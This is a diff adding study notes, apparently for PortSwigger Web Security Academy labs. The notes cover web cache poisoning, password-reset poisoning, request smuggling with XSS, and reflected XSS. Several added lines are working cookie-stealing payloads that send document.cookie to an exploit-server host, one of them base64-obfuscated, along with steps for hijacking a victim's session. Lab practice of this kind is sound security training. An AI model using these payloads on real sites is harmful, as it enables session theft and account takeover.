@@ -2023,8 +2023,55 @@ Add `X-Forwarded-Host` with host example.com or google.com\
 Send\
 See if host is reflected in response in /resources/js/tracking.js\
 See if `X-Cache: hit` is present\
+In exploit server, change file name to match the path used by the vulnerable response: /resources/js/tracking.js\
+In body `document.location='https://<exploitID>.web-security-academy.net/cookie.php?c='+document.cookie;`\
+Put the exploit server in the GET Request in Burp:\
+X-Forwarded-Host: exploit-ID.web-security-academy.net\
+Get rid of cache-bust\
+Submit Twice to get X-Cache: hit\
+In Exploit Server view logs for users cookie.\
+Turn on Intercept, click to go to My Account page and substitute in the cookie every time till you are logged in as Carlos.\
+Change the Email address and use the same cookie substitution.\
+Turn off Intercept.\
+Go to MyAccount and Forgot Password. Send password request for Carlos and view the email in Exploit server for Token to change password.\
 
-  
+- Reset password
+
+When entering the wrong user while trying to reset the password there is a specific error message -> `"Invalid username"`\
+This allows you to enumerate the user. Normally is “carlos” which seems to be the standard user across the web apps.\
+Selecting Home directory GET request and running ParamMiner finds additional headers to use. In this case X-Forwarded-Host is supported.\
+
+POST /forgot-password. Notice that the X-Forwarded-Host header is supported and you can use it to point the dynamically generated reset link to anarbitrary domain.\
+Make a note of the exploit server URL.\
+Go back to the request in Burp Repeater and add the X-Forwarded-Host header with your exploit server URL:\
+X-Forwarded-Host: your-exploit-server-id.web-security-academy.net\
+Change the username parameter to carlos and send the request.\
+
+- Smuggling + XSS
+
+Through User Agent\
+Let Burp Scanner find the HTTP Smuggle request and returns a 200 response, some will give you 400’s which are useless. Use that request, delete all the “sec” headers – they’re useless.\
+Add this to the end of the request that burp generated (changing url’s and all):\
+```
+GET /post?postId=4 HTTP/1.1
+Host: <change>.web-security-academy.net
+User-agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();
+x.open("GET","https://exploit-<change>.web-security-
+academy.net/"+document.cookie);x.send();</script>
+```
+And then send it through intruder with null payloads like 100 or so times\
+
+- XSS
+
+XSS in the search bar, the one where you have to check every tag, and every attribute through Burp Intruder\
+**Tags and attribute that was allowed:**\
+<body onhashchange=>\
+**Payload that was sent to victim**\
+
+```
+<iframe src="https://acac1f2c1e7f6507c0a71e0c00b100d9.web-security-academy.net/?query=%27%3Cbody%20onhashchange=%22eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXhwbG9pdC1hYzQ0MWY0MDFlZjg2NTkxYzA4ZDFlZGMwMWNlMDBiYy53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvP2M9Jytkb2N1bWVudC5jb29raWU'))%22%3E//"onload="this.onload='';this.src+='#XSS'"></iframe>
+```
+
 -----
 
 # Privilege Escalation  
